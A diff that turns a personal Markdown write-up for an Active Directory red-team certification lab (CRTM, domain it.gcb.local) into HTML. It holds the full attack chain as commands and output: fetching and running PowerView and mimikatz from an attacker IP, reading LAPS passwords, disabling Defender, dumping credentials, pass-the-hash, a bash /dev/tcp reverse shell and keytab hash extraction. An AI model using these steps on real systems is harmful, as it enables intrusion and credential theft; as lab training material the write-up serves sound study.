@@ -1,13 +1,74 @@
----
-layout: default
----
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
 
 
-With Domain user load powerview in order to enumerate interedting domain ACLs:
+<!-- Setup Google Analytics -->
 
-```
-PS C:\Users\itemployee15> IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
-PS C:\Users\itemployee15> Find-InterestingDomainAcl -ResolveGUIDs
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CRTM Walkthrough Global Central Bank | The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CRTM Walkthrough Global Central Bank" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
+<meta property="og:description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
+<link rel="canonical" href="http://localhost:4000/it-appsrv01.html" />
+<meta property="og:url" content="http://localhost:4000/it-appsrv01.html" />
+<meta property="og:site_name" content="CRTM Walkthrough Global Central Bank" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CRTM Walkthrough Global Central Bank" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/it-appsrv01.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CRTM Walkthrough Global Central Bank</h1>
+        </a>
+        <h2>The webpage it's based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</h2>
+
+        <section id="downloads">
+          
+            <a href="" class="btn">Download as .zip</a>
+            <a href="" class="btn">Download as .tar.gz</a>
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>With Domain user load powerview in order to enumerate interedting domain ACLs:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\itemployee15&gt; IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15/PowerView.ps1")
+PS C:\Users\itemployee15&gt; Find-InterestingDomainAcl -ResolveGUIDs
 ...
 
 ObjectDN                : CN=LocalAdmins,CN=Users,DC=it,DC=gcb,DC=local
@@ -22,17 +83,16 @@ IdentityReferenceName   : ITEmployeesUsers
 IdentityReferenceDomain : it.gcb.local
 IdentityReferenceDN     : CN=ITEmployeesUsers,CN=Users,DC=it,DC=gcb,DC=local
 IdentityReferenceClass  : group
-```
+</code></pre></div></div>
 
-Add Group Membership:
+<p>Add Group Membership:</p>
 
-```
-PS C:\Users\itemployee15> Import-Module C:\tools\PowerView.ps1
-PS C:\Users\itemployee15> Add-DomainGroupMember -Identity LocalAdmins -Members 'IT\ITEmployee15' -Verbose
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\itemployee15&gt; Import-Module C:\tools\PowerView.ps1
+PS C:\Users\itemployee15&gt; Add-DomainGroupMember -Identity LocalAdmins -Members 'IT\ITEmployee15' -Verbose
 VERBOSE: [Get-PrincipalContext] Binding to domain 'it.gcb.local'
 VERBOSE: [Add-DomainGroupMember] Adding member 'IT\ITEmployee15' to group 'LocalAdmins'
 
-PS C:\Users\itemployee15> Get-DomainGroupMember -Identity LocalAdmins
+PS C:\Users\itemployee15&gt; Get-DomainGroupMember -Identity LocalAdmins
 
 
 GroupDomain             : it.gcb.local
@@ -53,12 +113,11 @@ MemberDistinguishedName : CN=pa admin,CN=Users,DC=it,DC=gcb,DC=local
 MemberObjectClass       : user
 MemberSID               : S-1-5-21-948911695-1962824894-4291460450-1117
 
-```
+</code></pre></div></div>
 
-Abusse LAPS permissions and obtain administrator credentials:
+<p>Abusse LAPS permissions and obtain administrator credentials:</p>
 
-```
-PS C:\Users\itemployee15> Import-Module C:\tools\Get-LAPSPermissions.ps1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\itemployee15&gt; Import-Module C:\tools\Get-LAPSPermissions.ps1
 
 Read Rights
 
@@ -76,31 +135,29 @@ name        ms-mcs-admpwd
 ----        -------------
 IT-APPSRV01 2........
 
-```
+</code></pre></div></div>
 
-Access to target machine with admin privileges:
+<p>Access to target machine with admin privileges:</p>
 
-```
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value *
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Item WSMan:\localhost\Client\TrustedHosts -Value *
 
-PS C:\Windows\system32> winrs.exe -r:it-appsrv01.it.gcb.local -u:".\Administrator" -p:"2xDsu7p..-Q6]M" cmd
+PS C:\Windows\system32&gt; winrs.exe -r:it-appsrv01.it.gcb.local -u:".\Administrator" -p:"2xDsu7p..-Q6]M" cmd
 Microsoft Windows [Version 10.0.17763.5458]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Users\Administrator>whoami
+C:\Users\Administrator&gt;whoami
 whoami
 it-appsrv01\administrator
 
-C:\Users\Administrator>hostname
+C:\Users\Administrator&gt;hostname
 hostname
 it-appsrv01
 
-```
+</code></pre></div></div>
 
-Disable AV and Dump credentials:
+<p>Disable AV and Dump credentials:</p>
 
-```
-PS C:\Users\Administrator> Set-MpPreference -DisableRealTimeMonitoring $True
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Administrator&gt; Set-MpPreference -DisableRealTimeMonitoring $True
 Set-MpPreference -DisableRealTimeMonitoring $True
 
 wget http://192.168.100.15/mimikatz.exe -OutFile mimikatz.exe
@@ -110,9 +167,9 @@ wget http://192.168.100.15/mimikatz.exe -OutFile mimikatz.exe
   .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz(commandline) # privilege::debug
 Privilege '20' OK
@@ -316,35 +373,32 @@ mimikatz(commandline) # vault::cred /patch
 
 mimikatz(commandline) # exit
 Bye!
-```
+</code></pre></div></div>
 
-Impersonate Appmanager and access as local admin with Ubuntu VM permissions:
+<p>Impersonate Appmanager and access as local admin with Ubuntu VM permissions:</p>
 
-```
-.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:it.gcb.local /user:appmanager /ntlm:2c5d4678b83e5de26dc0338a0fcf6245 /run:powershell"
-```
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:it.gcb.local /user:appmanager /ntlm:2c5d4678b83e5de26dc0338a0fcf6245 /run:powershell"
+</code></pre></div></div>
 
-Access with app manager
-```
-Windows PowerShell
+<p>Access with app manager</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> Enter-PSSession -ComputerName it-appsrv01
-[it-appsrv01]: PS C:\Users\appmanager\Documents> whoami
+PS C:\Windows\system32&gt; Enter-PSSession -ComputerName it-appsrv01
+[it-appsrv01]: PS C:\Users\appmanager\Documents&gt; whoami
 it\appmanager
-[it-appsrv01]: PS C:\Users\appmanager\Documents> hostname
+[it-appsrv01]: PS C:\Users\appmanager\Documents&gt; hostname
 it-appsrv01
-[it-appsrv01]: PS C:\Users\appmanager\Documents>
-```
+[it-appsrv01]: PS C:\Users\appmanager\Documents&gt;
+</code></pre></div></div>
 
-Spawn reverse shell from Ubuntu VM target machine:
+<p>Spawn reverse shell from Ubuntu VM target machine:</p>
 
-```
-C:\Ubuntu\ubuntu.exe run '/bin/bash -l > /dev/tcp/192.168.100.15/443 0<&1 2>&1'
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Ubuntu\ubuntu.exe run '/bin/bash -l &gt; /dev/tcp/192.168.100.15/443 0&lt;&amp;1 2&gt;&amp;1'
 
 
-PS C:\tools> Import-Module .\powercat.ps1
-PS C:\tools> powercat -l -p 443 -v -t 99999
+PS C:\tools&gt; Import-Module .\powercat.ps1
+PS C:\tools&gt; powercat -l -p 443 -v -t 99999
 VERBOSE: Set Stream 1: TCP
 VERBOSE: Set Stream 2: Console
 VERBOSE: Setting up Stream 1...
@@ -380,12 +434,11 @@ lo        Link encap:Local Loopback
           collisions:0
           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
 
-``` 
+</code></pre></div></div>
 
-privilege escalation and extract keytab:
+<p>privilege escalation and extract keytab:</p>
 
-```
-appmanager@it-appsrv01:/mnt/c/Users/appmanager/Documents$ sudo -s
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>appmanager@it-appsrv01:/mnt/c/Users/appmanager/Documents$ sudo -s
 sudo -s
 [sudo] password for appmanager: appsrv
 
@@ -399,12 +452,11 @@ ls -ltrh
 total 0
 -rwxrwxrwx 1 appmanager appmanager 59 May 28  2019 sqlsrv02.keytab
 root@it-appsrv01:/root#
-```
+</code></pre></div></div>
 
-From kali attacker machine:
+<p>From kali attacker machine:</p>
 
-```
-┌──(kali㉿kali)-[~/KeyTabExtract]
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/KeyTabExtract]
 └─$ ls -ltrh
 total 16K
 -rw-r--r-- 1 kali kali   59 May  4 11:18 sqlsrv02.keytab
@@ -421,8 +473,11 @@ total 16K
         SERVICE PRINCIPAL : sqlsvc/
         NTLM HASH : 7782d820e5e5952b20b77a2240a03bbc
 
-```
+</code></pre></div></div>
 
+<p><a href="./section1.html">back</a></p>
 
-
-[back](./section1.html)
+      </section>
+    </div>
+  </body>
+</html>
